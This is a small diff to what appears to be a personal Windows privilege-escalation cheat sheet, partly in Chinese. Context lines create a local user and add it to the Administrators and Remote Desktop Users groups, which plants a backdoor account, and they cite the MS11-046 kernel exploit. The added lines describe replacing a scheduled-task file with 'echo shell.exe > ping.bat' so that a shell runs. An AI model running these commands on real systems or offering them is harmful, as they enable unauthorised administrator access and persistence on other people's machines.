@@ -35,6 +35,8 @@ net user timmy timmy /add
 net  localgroup "Remote Desktop Users" "timmy" /add
 net  localgroup "Administrators" "timmy" /add
 23. 內核漏洞windows7 MS11-046
+24. download document資料夾下查找可能是定時任務檔案做替換
+echo shell.exe > ping.bat
 
 ###windows 提權限參考
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
